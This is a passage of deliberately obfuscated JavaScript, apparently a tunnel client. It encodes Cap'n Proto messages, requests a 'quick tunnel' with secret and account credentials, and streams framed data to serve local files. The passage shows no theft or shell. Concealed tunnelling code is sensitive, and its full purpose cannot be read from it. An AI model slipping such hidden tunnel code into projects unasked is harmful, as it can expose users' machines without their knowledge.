        this['words'][a] = d[dH(0x6d1)](d[dH(0x357)](this[dH(0x29d)][a], ~f), d['HHWME'](d[dH(0xf0)](BigInt, d[dH(0x110)](c, 0xffff)), BigInt(d['fAtpt'](b, 0x8))));
    }
    [a0aY(0x26f)](a, b, c) {
        const dI = a0aY, d = {
                'MDzCg': function (g, h) {
                    return g << h;
                },
                'shSxQ': function (g, h) {
                    return g(h);
                },
                'ovQLZ': function (g, h) {
                    return g | h;
                },
                'xBACB': function (g, h) {
                    return g(h);
                },
                'tjmQI': function (g, h) {
                    return g & h;
                },
                'oPWwc': function (g, h) {
                    return g * h;
                }
            }, f = d[dI(0x40f)](0xffffffffn, d[dI(0x76d)](BigInt, b * 0x8));
        this[dI(0x29d)][a] = d[dI(0x6fd)](this[dI(0x29d)][a] & ~f, d[dI(0x40f)](d['xBACB'](BigInt, d[dI(0x2a5)](c, 0xffffffff)), BigInt(d[dI(0x7a3)](b, 0x8))));
    }
    [a0aY(0x835)](a, b) {
        const dJ = a0aY, c = {
                'CaSkY': function (d, f) {
                    return d & f;
                }
            };
        this[dJ(0x29d)][a] = c[dJ(0x34b)](BigInt(b), 0xffffffffffffffffn);
    }
    [a0aY(0x879)](a, b, c = ![]) {
        const dK = a0aY, d = {
                'xgfHy': function (m, n) {
                    return m === n;
                },
                'weSHx': dK(0x33e),
                'ZukNN': dK(0x330),
                'qFrIE': function (m, n) {
                    return m + n;
                },
                'eyHnu': function (m, n) {
                    return m / n;
                },
                'fgZct': function (m, n) {
                    return m < n;
                },
                'paPkH': function (m, n) {
                    return m % n;
                },
                'qERqF': function (m, n) {
                    return m - n;
                },
                'XNCGe': function (m, n) {
                    return m - n;
                },
                'wWfyg': function (m, n) {
                    return m | n;
                },
                'LZsZr': function (m, n) {
                    return m << n;
                },
                'UTXve': function (m, n) {
                    return m | n;
                },
                'onzAt': function (m, n) {
                    return m << n;
                }
            }, f = d['xgfHy'](typeof b, d['weSHx']) ? Buffer[dK(0x317)](b, d[dK(0x3bf)]) : b, g = d['qFrIE'](f[dK(0x8fc)], c ? 0x1 : 0x0), h = this[dK(0x5fd)](Math['ceil'](d[dK(0x5f2)](g, 0x8)));
        for (let m = 0x0; d[dK(0x705)](m, f['length']); m++) {
            this[dK(0x682)](h + Math[dK(0x7c7)](d[dK(0x5f2)](m, 0x8)), d[dK(0x8cc)](m, 0x8), f[m]);
        }
        const j = d[dK(0x65d)](d[dK(0x1a3)](h, a), 0x1), k = d[dK(0x418)](BigInt(j) << 0x2n, 0x1n) & 0xffffffffn, l = d['wWfyg'](0x2n, d[dK(0xe3)](BigInt(g & 0x1fffffff), 0x3n));
        this[dK(0x29d)][a] = d[dK(0x83d)](k, d[dK(0x6f5)](l, 0x20n));
    }
    ['writeTextList'](a, b) {
        const dL = a0aY, c = {
                'DXGHf': function (g, h) {
                    return g - h;
                },
                'vnqqz': function (g, h) {
                    return g | h;
                },
                'rnlKc': function (g, h) {
                    return g & h;
                },
                'pRhSZ': function (g, h) {
                    return g << h;
                },
                'iYRBp': function (g, h) {
                    return g < h;
                },
                'JjzOQ': function (g, h) {
                    return g + h;
                }
            };
        if (!b[dL(0x8fc)]) {
            this[dL(0x29d)][a] = 0x0n;
            return;
        }
        const d = this[dL(0x5fd)](b[dL(0x8fc)]), f = c[dL(0x6ec)](c['DXGHf'](d, a), 0x1);
        this[dL(0x29d)][a] = c[dL(0x61d)](c[dL(0x804)](c[dL(0x541)](BigInt(f), 0x2n) | 0x1n, 0xffffffffn), (0x6n | BigInt(b[dL(0x8fc)]) << 0x3n) << 0x20n);
        for (let g = 0x0; c['iYRBp'](g, b[dL(0x8fc)]); g++) {
            this[dL(0x879)](c[dL(0x6ed)](d, g), b[g], !![]);
        }
    }
    [a0aY(0x1e7)]() {
        const dM = a0aY, a = {
                'XtBFo': function (d, f) {
                    return d * f;
                },
                'EMVjE': function (d, f) {
                    return d < f;
                },
                'PamDi': function (d, f) {
                    return d & f;
                }
            }, b = Buffer[dM(0x5fd)](0x8);
        b[dM(0x641)](0x0, 0x0), b[dM(0x641)](this[dM(0x29d)][dM(0x8fc)], 0x4);
        const c = Buffer[dM(0x5fd)](a[dM(0xf4)](this[dM(0x29d)][dM(0x8fc)], 0x8));
        for (let d = 0x0; a[dM(0x8d9)](d, this[dM(0x29d)][dM(0x8fc)]); d++) {
            c['writeBigUInt64LE'](a[dM(0x7cf)](this[dM(0x29d)][d], 0xffffffffffffffffn), d * 0x8);
        }
        return Buffer[dM(0x65f)]([
            b,
            c
        ]);
    }
}
function a0ak(a) {
    const dN = a0aY, b = new a0aj(), c = b['alloc'](0x1), d = b[dN(0x5fd)](0x1), f = b[dN(0x5fd)](0x1);
    b[dN(0x86c)](c, d, 0x1, 0x1), b['setU16'](d, 0x0, 0x8);
    const g = b[dN(0x5fd)](0x1);
    return b[dN(0x5fd)](0x1), b[dN(0x86c)](f, g, 0x1, 0x1), b[dN(0x26f)](g, 0x0, a), b['finish']();
}
function a0al(a, b, c, d, f, g) {
    const dO = a0aY, h = {
            'HDIqE': function (H, I) {
                return H | I;
            },
            'lXFvX': function (H, I) {
                return H & I;
            },
            'QYsjx': function (H, I) {
                return H | I;
            },
            'MElXY': function (H, I) {
                return H & I;
            },
            'LlpkJ': 'allow_remote_config',
            'QdfsY': dO(0xf9),
            'tnLYJ': dO(0x3ce)
        }, i = new a0aj(), j = i[dO(0x5fd)](0x1), k = i['alloc'](0x1), l = i[dO(0x5fd)](0x1);
    i[dO(0x86c)](j, k, 0x1, 0x1), i[dO(0x10c)](k, 0x0, 0x2);
    const m = i[dO(0x5fd)](0x1), n = i['alloc'](0x1);
    i[dO(0x5fd)](0x1);
    const o = i[dO(0x5fd)](0x1), p = i[dO(0x5fd)](0x1);
    i[dO(0x5fd)](0x1), i[dO(0x86c)](l, m, 0x3, 0x3), i[dO(0x26f)](m, 0x0, a), i[dO(0x835)](n, 0xf71695ec7fe85497n);
    const q = i[dO(0x5fd)](0x1), r = i[dO(0x5fd)](0x1);
    i[dO(0x86c)](o, q, 0x1, 0x1), i['setU16'](q, 0x4, 0x1);
    const s = i[dO(0x5fd)](0x1);
    i[dO(0x5fd)](0x1), i[dO(0x86c)](r, s, 0x1, 0x1), i['setU32'](s, 0x0, b);
    const t = i[dO(0x5fd)](0x1);
    i[dO(0x5fd)](0x1), i[dO(0x86c)](p, t, 0x0, 0x2);
    const u = i[dO(0x5fd)](0x1), v = i[dO(0x5fd)](0x1), w = i[dO(0x5fd)](0x1), x = i[dO(0x5fd)](0x1);
    i[dO(0x86c)](t, u, 0x1, 0x3), i[dO(0x682)](u, 0x0, g);
    const y = i['alloc'](0x1), z = i[dO(0x5fd)](0x1);
    i[dO(0x86c)](v, y, 0x0, 0x2), i[dO(0x879)](y, c, !![]), i[dO(0x879)](z, d), i['writeBytes'](w, f);
    const A = i[dO(0x5fd)](0x1), B = i[dO(0x5fd)](0x1);
    i[dO(0x5fd)](0x1), i[dO(0x86c)](x, A, 0x1, 0x2);
    const C = i['alloc'](0x1), D = i[dO(0x5fd)](0x1), E = i['alloc'](0x1), F = i[dO(0x5fd)](0x1);
    i[dO(0x86c)](B, C, 0x0, 0x4);
    const G = a0k[dO(0x6de)](0x10);
    return G[0x6] = h[dO(0x139)](h['lXFvX'](G[0x6], 0xf), 0x40), G[0x8] = h[dO(0x5f0)](h[dO(0x39f)](G[0x8], 0x3f), 0x80), i[dO(0x879)](C, G), i[dO(0x5d7)](D, [
        dO(0x40c),
        h[dO(0x1be)]
    ]), i[dO(0x879)](E, h[dO(0x200)], !![]), i[dO(0x879)](F, h[dO(0x544)], !![]), i[dO(0x1e7)]();
}
function a0am(a) {
    const dP = a0aY, b = {
            'VTuIi': function (f, g) {
                return f >= g;
            },
            'SBQCa': function (f, g) {
                return f - g;
            },
            'QVTpb': function (f, g) {
                return f + g;
            },
            'ONQFn': function (f, g) {
                return f * g;
            },
            'NyXYw': function (f, g) {
                return f % g;
            },
            'XRAVS': function (f, g) {
                return f < g;
            },
            'EapCm': function (f, g) {
                return f - g;
            },
            'xptZU': function (f, g) {
                return f + g;
            },
            'jVFnm': function (f, g) {
                return f * g;
            },
            'JvVMC': function (f, g) {
                return f + g;
            },
            'BhRnn': function (f, g) {
                return f < g;
            },
            'kJdFl': function (f, g) {
                return f !== g;
            },
            'dPQNI': dP(0x8a1),
            'wtKmk': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b[dP(0x6df)](b[dP(0x313)](a[dP(0x8fc)], d), 0x8)) {
        const f = a[dP(0x34f)](d), g = a['readUInt32LE'](b[dP(0x267)](d, 0x4)), h = b[dP(0x267)](f, 0x1);
        let j = b[dP(0x267)](0x2, h), k = b[dP(0x4b2)](j, 0x4);
        b[dP(0x886)](k, 0x8) && (k += 0x4);
        if (b[dP(0x926)](b[dP(0x4cc)](a[dP(0x8fc)], d), k))
            break;
        const l = [g];
        for (let n = 0x1; b[dP(0x926)](n, h); n++) {
            l[dP(0x1f0)](a[dP(0x34f)](b[dP(0x515)](b[dP(0x267)](d, 0x4), b[dP(0x2de)](n, 0x4))));
        }
        const m = b[dP(0x5ce)](k, b[dP(0x4b2)](l[dP(0x2a3)]((o, p) => o + p, 0x0), 0x8));
        if (b[dP(0x70a)](b[dP(0x313)](a[dP(0x8fc)], d), m))
            break;
        if (b[dP(0x862)](h, 0x1))
            throw new Error(b['dPQNI']);
        c[dP(0x1f0)](a['subarray'](b[dP(0x4c4)](d, k), d + m)), d += m;
    }
    return [
        c,
        a[dP(0x6e2)](d)
    ];
}
function a0an(a, b) {
    const dQ = a0aY, c = {
            'ZKbSV': function (j, k) {
                return j >= k;
            },
            'ilDGo': function (j, k) {
                return j !== k;
            },
            'fRuMs': function (j, k) {
                return j & k;
            },
            'SdYEe': dQ(0x5e1),
            'qTKYD': function (j, k) {
                return j >> k;
            },
            'DVzcc': function (j, k) {
                return j + k;
            },
            'spbkT': function (j, k) {
                return j(k);
            },
            'XHXYR': function (j, k) {
                return j & k;
            },
            'UUDgJ': function (j, k) {
                return j >> k;
            },
            'YCDmd': function (j, k) {
                return j & k;
            },
            'SawNq': function (j, k) {
                return j >> k;
            },
            'DuozX': function (j, k) {
                return j < k;
            },
            'nfNvz': function (j, k) {
                return j + k;
            },
            'xVQps': 'Cap\x27n\x20Proto\x20pointer\x20out\x20of\x20bounds'
        };
    if (c['ZKbSV'](b, a[dQ(0x8fc)]))
        throw new Error(dQ(0x2b6));
    const d = a[b];
    if (c[dQ(0xd2)](c[dQ(0x30a)](d, 0x3n), 0x0n))
        throw new Error(c[dQ(0x7af)]);
    let f = c['fRuMs'](c['qTKYD'](d, 0x2n), 0x3fffffffn);
    c[dQ(0x30a)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dQ(0x37f)](c['DVzcc'](b, 0x1), Number(f)), h = c[dQ(0xd7)](Number, c[dQ(0x5e7)](c['UUDgJ'](d, 0x20n), 0xffffn)), i = Number(c['YCDmd'](c[dQ(0x1ff)](d, 0x30n), 0xffffn));
    if (c[dQ(0x1a1)](g, 0x0) || c[dQ(0x37f)](c[dQ(0xee)](g, h), i) > a[dQ(0x8fc)])
        throw new Error(c[dQ(0x157)]);
    return [
        g,
        h,
        i
    ];
}
function a0ao(a, b) {
    const dR = a0aY, c = {
            'cHTgC': function (m, n) {
                return m >= n;
            },
            'uUXWH': function (m, n) {
                return m & n;
            },
            'jSHOp': function (m, n) {
                return m & n;
            },
            'aCNcE': function (m, n) {
                return m >> n;
            },
            'xjlFT': function (m, n) {
                return m + n;
            },
            'cpWUa': function (m, n) {
                return m + n;
            },
            'Jjsqq': function (m, n) {
                return m(n);
            },
            'edqHA': function (m, n) {
                return m / n;
            },
            'xCXGn': function (m, n) {
                return m !== n;
            },
            'NgIcO': function (m, n) {
                return m < n;
            },
            'hNfel': function (m, n) {
                return m > n;
            },
            'iNPqI': function (m, n) {
                return m * n;
            },
            'xNWme': function (m, n) {
                return m < n;
            },
            'FqNRI': function (m, n) {
                return m + n;
            },
            'veGup': function (m, n) {
                return m * n;
            }
        };
    if (c['cHTgC'](b, a['length']))
        return '';
    const d = a[b];
    if (c[dR(0x785)](d, 0x3n) !== 0x1n)
        return '';
    let f = c[dR(0x3eb)](c[dR(0x33b)](d, 0x2n), 0x3fffffffn);
    c['jSHOp'](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dR(0x8fa)](c[dR(0x1c6)](b, 0x1), Number(f)), h = c[dR(0x2fd)](Number, c[dR(0x785)](c['aCNcE'](d, 0x20n), 0x7n)), j = Number(c[dR(0x33b)](d, 0x23n)), k = Math[dR(0x10f)](c[dR(0x1e5)](j, 0x8));
    if (c[dR(0x4dd)](h, 0x2) || c[dR(0x13a)](g, 0x0) || c['hNfel'](c['xjlFT'](g, k), a[dR(0x8fc)]))
        return '';
    const l = Buffer[dR(0x5fd)](c[dR(0x445)](k, 0x8));
    for (let m = 0x0; c[dR(0x629)](m, k); m++) {
        l[dR(0x621)](c[dR(0x3eb)](a[c[dR(0x4eb)](g, m)], 0xffffffffffffffffn), c[dR(0x388)](m, 0x8));
    }
    return l['subarray'](0x0, j)[dR(0x62f)](dR(0x330))['replace'](/\0+$/, '');
}
function a0ap(a) {
    const dS = a0aY, b = {
            'yNYzG': function (z, A) {
                return z % A;
            },
            'zMdmA': function (z, A) {
                return z < A;
            },
            'AawwA': 'short\x20Cap\x27n\x20Proto\x20return',
            'fEDzU': function (z, A) {
                return z / A;
            },
            'WWJTo': function (z, A) {
                return z * A;
            },
            'ujobe': function (y, z, A) {
                return y(z, A);
            },
            'FjqNQ': function (z, A) {
                return z < A;
            },
            'ttVzx': function (z, A) {
                return z !== A;
            },
            'sGEzG': function (z, A) {
                return z & A;
            },
            'onRFR': function (z, A) {
                return z + A;
            },
            'WmLFz': function (y, z) {
                return y(z);
            },
            'pkXhM': function (z, A) {
                return z >> A;
            },
            'dwoDc': function (z, A) {
                return z + A;
            },
            'MANyO': function (y, z, A) {
                return y(z, A);
            },
            'kdWYy': function (y, z, A) {
                return y(z, A);
            },
            'ervlT': function (z, A) {
                return z === A;
            },
            'hrJCj': function (z, A) {
                return z !== A;
            },
            'CJNEz': dS(0x31d),
            'GvWbx': function (y, z, A) {
                return y(z, A);
            },
            'wAWmK': function (z, A) {
                return z + A;
            }
        };
    if (b['yNYzG'](a[dS(0x8fc)], 0x8) || b[dS(0x5e9)](a[dS(0x8fc)], 0x18))
        throw new Error(b[dS(0x1a4)]);
    const c = [];
    for (let y = 0x0; b[dS(0x5e9)](y, b[dS(0x87a)](a['length'], 0x8)); y++) {
        c['push'](a[dS(0x74b)](b[dS(0x23b)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b['ujobe'](a0an, c, 0x0);
    if (b[dS(0x3c1)](f, 0x1) || b['ttVzx'](b[dS(0x1eb)](c[d], 0xffffn), 0x3n))
        throw new Error(dS(0x336));
    let h, j, k;
    [h, j, k] = a0an(c, b[dS(0x17b)](d, f));
    const l = b[dS(0x8b9)](Number, b[dS(0x1eb)](b[dS(0x2d3)](c[h], 0x30n), 0xffffn));
    if (l === 0x1)
        return {
            'ok': ![],
            'error': b[dS(0x39d)](a0ao, c, b[dS(0x194)](h, j))
        };
    if (b[dS(0x7f8)](l, 0x0))
        return {
            'ok': ![],
            'error': dS(0x67c) + l
        };
    let m, n, o;
    [m, n, o] = b[dS(0x481)](a0an, c, h + j);
    let p, q, r;
    [p, q, r] = b[dS(0x31f)](a0an, c, m + n);
    const s = c[p], t = Number(s & 0xffffn);
    if (b[dS(0x4b6)](t, 0x0))
        return {
            'ok': ![],
            'error': a0ao(c, p + q)
        };
    if (b[dS(0x59e)](t, 0x1))
        return {
            'ok': ![],
            'error': b[dS(0x1e0)] + t
        };
    let u, v, w;
    [u, v, w] = b[dS(0x481)](a0an, c, p + q);
    const x = b[dS(0x6e8)](a0ao, c, b[dS(0x194)](b[dS(0x807)](u, v), 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': Boolean(c[u] & 0x1n)
    };
}
const a0aq = {
    '.js': a0aY(0x4ad),
    '.mjs': 'text/javascript;\x20charset=utf-8',
    '.css': a0aY(0x502),
    '.json': 'application/json;\x20charset=utf-8',
    '.map': a0aY(0x285),
    '.wasm': a0aY(0x2e1),
    '.html': a0aY(0x3b7),
    '.htm': a0aY(0x3b7),
    '.svg': a0aY(0x33a),
    '.xml': a0aY(0x923),
    '.woff': a0aY(0x6a2),
    '.woff2': a0aY(0x6a2),
    '.png': a0aY(0x45a),
    '.jpg': a0aY(0x255),
    '.jpeg': 'image/jpeg',
    '.gif': a0aY(0x109),
    '.ico': a0aY(0x527)
};
function a0ar(a) {
    const dT = a0aY, b = {
            'IySqj': function (f, g) {
                return f < g;
            }
        }, c = a[dT(0x416)]('/') ? a[dT(0x806)](0x0, -0x1) : a, d = c['lastIndexOf']('.');
    if (b[dT(0x4b1)](d, 0x0))
        return '';
    return a0aq[c['slice'](d)[dT(0x52c)]()] || '';
}
function a0as(a) {
    const dU = a0aY, b = {
            'HPvof': function (c, d) {
                return c !== d;
            },
            'kcMUW': dU(0x33e),
            'KfwxB': function (c, d) {
                return c + d;
            }
        };
    if (Array[dU(0x22c)](a))
        return Buffer[dU(0x317)](a);
    if (b[dU(0x26c)](typeof a, b['kcMUW']))
        throw new Error(dU(0x69d));
    return Buffer[dU(0x317)](b[dU(0x400)](a, '='[dU(0x7c6)](-a[dU(0x8fc)] % 0x4)), dU(0x262));
}
const a0at = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0au(a) {
    const dV = a0aY, b = {
            'CdUCt': function (c, d) {
                return c(d);
            },
            'vWKdF': function (c, d) {
                return c + d;
            },
            'Qbyjm': dV(0x61a),
            'GjktK': dV(0x67d),
            'TVAUu': dV(0x330),
            'JHSIo': dV(0x23c),
            'KodmG': function (c, d) {
                return c(d);
            },
            'JhxgC': dV(0x103),
            'sbKvw': dV(0x173),
            'SuhQP': 'data',
            'Wjaqn': dV(0x233),
            'UEXHc': dV(0x882),
            'FubRD': function (c, d) {
                return c(d);
            },
            'DCPxm': function (c, d) {
                return c + d;
            },
            'cuXMJ': 'requesting\x20quick\x20tunnel\x20failed:\x20',
            'XDjCi': function (c, d) {
                return c === d;
            },
            'WAOPq': dV(0x479),
            'ZyUeX': dV(0x3d4),
            'PsfBN': dV(0x7eb),
            'TJTYp': dV(0x1e9)
        };
    return new Promise((c, d) => {
        const dZ = dV, f = {
                'WWHLr': function (j, k) {
                    const dW = a0b;
                    return b[dW(0x7d4)](j, k);
                },
                'dGDPM': function (j, k) {
                    const dX = a0b;
                    return b[dX(0x674)](j, k);
                },
                'MnkZl': function (j, k) {
                    const dY = a0b;
                    return b[dY(0x674)](j, k);
                },
                'bQvCZ': b[dZ(0x8ba)],
                'cAnBc': b[dZ(0x134)],
                'hEyoo': b['TVAUu'],
                'pZqzd': b[dZ(0x1c4)],
                'TTCla': function (j, k) {
                    const e0 = dZ;
                    return b[e0(0x590)](j, k);
                },
                'VYXYE': b[dZ(0x663)],
                'aPPRF': function (j, k) {
                    return j !== k;
                },
                'KNxlG': b[dZ(0x1dd)],
                'SBPLg': function (j, k) {
                    return j + k;
                },
                'heIit': b[dZ(0x2d8)],
                'qZvOE': b['Wjaqn']
            };
        let g;
        try {
            g = new URL(a['replace'](/\/+$/, '') + b[dZ(0x92e)]);
        } catch (j) {
            b[dZ(0x7b5)](d, new Error(b[dZ(0x842)](b['cuXMJ'], j[dZ(0x113)])));
            return;
        }
        const h = b[dZ(0x1fa)](g[dZ(0x5cb)], b['WAOPq']) ? a0h : a0g, i = h[dZ(0x713)](g, {
                'method': b['ZyUeX'],
                'headers': {
                    'Content-Type': dZ(0x814),
                    'User-Agent': b[dZ(0xf3)]
                },
                'timeout': 0x3a98
            }, k => {
                const e3 = dZ, l = {
                        'eDtOO': function (n, o) {
                            const e1 = a0b;
                            return f[e1(0x163)](n, o);
                        },
                        'aOdkz': function (n, o) {
                            return f['dGDPM'](n, o);
                        },
                        'qjHJV': function (n, o) {
                            const e2 = a0b;
                            return f[e2(0x5b7)](n, o);
                        },
                        'ChKjB': f[e3(0x587)],
                        'CKUOL': f[e3(0x171)],
                        'cJMns': f[e3(0xfd)],
                        'NfMkK': function (n, o) {
                            const e4 = e3;
                            return f[e4(0x5b7)](n, o);
                        },
                        'LVALJ': f[e3(0x49c)],
                        'JYBbY': function (n, o) {
                            const e5 = e3;
                            return f[e5(0x383)](n, o);
                        },
                        'swKBy': f['VYXYE'],
                        'REutH': function (n, o) {
                            const e6 = e3;
                            return f[e6(0x5c0)](n, o);
                        },
                        'CquTF': e3(0x33e),
                        'YNRyu': f[e3(0x812)],
                        'rHPgO': e3(0x20c),
                        'oCGPs': function (n, o) {
                            const e7 = e3;
                            return f[e7(0x152)](n, o);
                        },
                        'XJZNl': e3(0xf1)
                    }, m = [];
                k['on'](f['heIit'], n => m['push'](n)), k['on']('error', d), k['on'](f[e3(0x6ca)], () => {
                    const e8 = e3, n = Buffer[e8(0x65f)](m), o = k[e8(0x14e)];
                    let p;
                    try {
                        p = JSON[e8(0x675)](n[e8(0x62f)](e8(0x330)));
                    } catch (r) {
                        l[e8(0x6b4)](d, new Error(l[e8(0x328)](l[e8(0x334)](l[e8(0x334)](l[e8(0x115)], o), l['CKUOL']), n[e8(0x6e2)](0x0, 0x12c)[e8(0x62f)](l[e8(0x554)]))));
                        return;
                    }
                    const q = p[e8(0x230)] || {};
                    if (!(p[e8(0x437)] ?? !![]) || !q) {
                        l[e8(0x6b4)](d, new Error(l[e8(0x588)](l[e8(0x364)], JSON[e8(0x789)](p[e8(0x169)]))));
                        return;
                    }
                    try {
                        const s = l['JYBbY'](String, q['id']);
                        if (!a0at['test'](s))
                            throw new Error(l['swKBy']);
                        if (l['REutH'](typeof q[e8(0x37b)], l[e8(0x4ca)]) || typeof q[e8(0x65c)] !== l[e8(0x4ca)])
                            throw new Error(l[e8(0x8f9)]);
                        const t = l['JYBbY'](a0as, q[e8(0x175)]), u = Buffer[e8(0x317)](s[e8(0x7ee)](/-/g, ''), l[e8(0x3dd)]);
                        l['JYBbY'](c, [
                            q[e8(0x65c)],
                            q[e8(0x37b)],
                            t,
                            u
                        ]);
                    } catch (v) {
                        d(new Error(l[e8(0x1d4)](l[e8(0x2ad)], v[e8(0x113)])));
                    }
                });
            });
        i['on'](b[dZ(0x801)], k => d(new Error(dZ(0x510) + k['message']))), i[dZ(0x233)]();
    });
}
function a0av(a) {
    const e9 = a0aY;
    return a['map'](([b, c]) => Buffer[e9(0x317)](b, e9(0x330))[e9(0x62f)](e9(0x262))[e9(0x7ee)](/=+$/, '') + ':' + Buffer[e9(0x317)](c, e9(0x330))['toString'](e9(0x262))[e9(0x7ee)](/=+$/, ''))[e9(0x2e0)](';');
}
class a0aw {
    constructor(a) {
        const ea = a0aY, b = {
                'nyWKj': ea(0x7a4),
                'FCuvM': 'error',
                'aRWif': ea(0x233),
                'Xvkah': ea(0x4a5)
            };
        this[ea(0x6e4)] = a, this[ea(0x10a)] = Buffer[ea(0x5fd)](0x0), this[ea(0x57b)] = [], this[ea(0x63d)] = null, this['closed'] = ![], a['on'](b[ea(0xea)], c => {
            const eb = ea;
            this[eb(0x10a)] = this['buffer'][eb(0x8fc)] ? Buffer['concat']([
                this['buffer'],
                c
            ]) : c, this[eb(0x832)]();
        }), a['on'](b[ea(0x229)], c => {
            const ec = ea;
            this[ec(0x63d)] = c, this['_drain']();
        }), a['on'](b[ea(0x122)], () => {
            const ed = ea;
            this[ed(0x7de)] = !![], this['_drain']();
        }), a['on'](b['Xvkah'], () => {
            const ee = ea;
            this[ee(0x7de)] = !![], this[ee(0x832)]();
        });
    }
    ['_drain']() {
        const ef = a0aY, a = {
                'UGWEV': function (b, c) {
                    return b > c;
                },
                'IOTIR': function (b, c) {
                    return b >= c;
                },
                'pqodm': function (b, c) {
                    return b !== c;
                },
                'kyBdV': ef(0x5de)
            };
        while (a[ef(0x8d3)](this[ef(0x57b)][ef(0x8fc)], 0x0)) {
            const b = this[ef(0x57b)][0x0];
            if (a[ef(0x6d4)](this[ef(0x10a)]['length'], b['need'])) {
                this[ef(0x57b)]['shift']();
                const c = this[ef(0x10a)][ef(0x6e2)](0x0, b['need']);
                this['buffer'] = this[ef(0x10a)][ef(0x6e2)](b[ef(0x138)]), b['resolve'](c);
            } else {
                if (a[ef(0x332)](this[ef(0x63d)], null))
                    this[ef(0x57b)][ef(0x773)](), b[ef(0x762)](this[ef(0x63d)]);
                else {
                    if (this['closed'])
                        this[ef(0x57b)]['shift'](), b[ef(0x762)](new Error(a[ef(0x6d5)]));
                    else
                        break;
                }
            }
        }
    }
    [a0aY(0x7e6)](a) {
        const eg = a0aY, b = {
                'gPIpC': function (c, d) {
                    return c !== d;
                },
                'mHsVk': function (c, d) {
                    return c >= d;
                },
                'huYph': 'connection\x20closed'
            };
        if (b[eg(0x535)](this[eg(0x63d)], null))
            return Promise[eg(0x762)](this[eg(0x63d)]);
        if (b[eg(0x733)](this[eg(0x10a)]['length'], a)) {
            const c = this['buffer'][eg(0x6e2)](0x0, a);
            return this[eg(0x10a)] = this[eg(0x10a)][eg(0x6e2)](a), Promise['resolve'](c);
        }
        if (this[eg(0x7de)])
            return Promise[eg(0x762)](new Error(b[eg(0x492)]));
        return new Promise((d, f) => {
            const eh = eg;
            this[eh(0x57b)][eh(0x1f0)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[eh(0x832)]();
        });
    }
}
class a0ax {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const ei = a0aY, l = { 'WuXqm': ei(0x5d9) }, m = l[ei(0x4ae)]['split']('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this['tunnelUrl'] = i;
                continue;
            case '1':
                this[ei(0x239)] = j;
                continue;
            case '2':
                this['sock'] = a;
                continue;
            case '3':
                this[ei(0x191)] = 0xffff;
                continue;
            case '4':
                this[ei(0x665)] = k || { 'printed': ![] };
                continue;
            case '5':
                this['registrationFailed'] = ![];
                continue;
            case '6':
                this[ei(0x4de)] = new Map();
                continue;
            case '7':
                this[ei(0x59c)] = new Map();
                continue;
            case '8':
                this[ei(0x78e)] = g;
                continue;
            case '9':
                this[ei(0x401)] = b;
                continue;
            case '10':
                this[ei(0x36a)] = a0a6;
                continue;
            case '11':
                this['windowWaiters'] = [];
                continue;
            case '12':
                this['tunnelId'] = f;
                continue;
            case '13':
                this['accountTag'] = c;
                continue;
            case '14':
                this['reader'] = new a0aw(a);
                continue;
            case '15':
                this[ei(0x42a)] = ![];
                continue;
            case '16':
                this['log'] = h;
                continue;
            case '17':
                this['tunnelSecret'] = d;
                continue;
            case '18':
                this[ei(0x4e3)] = new a0af();
                continue;
            case '19':
                this[ei(0x283)] = ![];
                continue;
            case '20':
                this[ei(0x1a9)] = null;
                continue;
            }
            break;
        }
    }
    [a0aY(0x55e)](a, b, c, d = Buffer['alloc'](0x0)) {
        const ej = a0aY, f = {
                'lRwyq': ej(0x861),
                'gQLCU': function (h, i) {
                    return h & i;
                }
            };
        if (d[ej(0x8fc)] > 0xffffff)
            throw new Error(f['lRwyq']);
        const g = Buffer[ej(0x5fd)](0x9);
        g['writeUIntBE'](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[ej(0x4c6)](f[ej(0x5da)](c, 0x7fffffff), 0x5), this['sock'][ej(0x624)](Buffer[ej(0x65f)]([
            g,
            d
        ]));
    }
    [a0aY(0x520)](a, b, c = ![]) {
        const ek = a0aY, d = {
                'HISDi': function (h, i) {
                    return h(i);
                },
                'SiGOu': function (h, i) {
                    return h | i;
                }
            }, f = d[ek(0x735)](a0ai, b), g = d[ek(0x5cc)](0x4, c ? 0x1 : 0x0);
        this[ek(0x55e)](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const el = a0aY, b = {
                'bodca': function (c, d) {
                    return c > d;
                }
            };
        if (b[el(0x8be)](this[el(0x191)], 0x0) && b[el(0x8be)](this['streamWindows'][el(0x14d)](a) ?? 0xffff, 0x0))
            return Promise[el(0x791)]();
        return new Promise(c => {
            const em = el;
            this['windowWaiters'][em(0x1f0)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aY(0x1f6)]() {
        const en = a0aY, a = {
                'HhzTK': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[en(0x477)]) {
            const d = this[en(0x59c)]['get'](c[en(0x8ae)]) ?? 0xffff;
            this[en(0x191)] > 0x0 && a['HhzTK'](d, 0x0) ? c['resolve']() : b['push'](c);
        }
        this[en(0x477)] = b;
    }
    ['_releaseWaiters']() {
        const eo = a0aY;
        for (const a of this['windowWaiters']) {
            a[eo(0x791)]();
        }
        this['windowWaiters'] = [];
    }
    async [a0aY(0x865)](a, b, c = ![]) {
        const ep = a0aY, d = {
                'ClsEK': function (h, i) {
                    return h >= i;
                },
                'fwTDS': function (h, i) {
                    return h + i;
                },
                'QBRmg': function (h, i) {
                    return h - i;
                },
                'QiMVi': function (h, i) {
                    return h < i;
                }
            }, f = b[ep(0x8fc)];
        let g = 0x0;
        do {
            await this['_waitWindow'](a);
            if (this[ep(0x42a)])
                return;
            const h = this[ep(0x59c)][ep(0x14d)](a) ?? 0xffff, i = Math[ep(0x687)](f - g, this[ep(0x191)], h, this[ep(0x36a)]), j = c && d['ClsEK'](d[ep(0x821)](g, i), f) ? 0x1 : 0x0, k = b['subarray'](g, d[ep(0x821)](g, i));
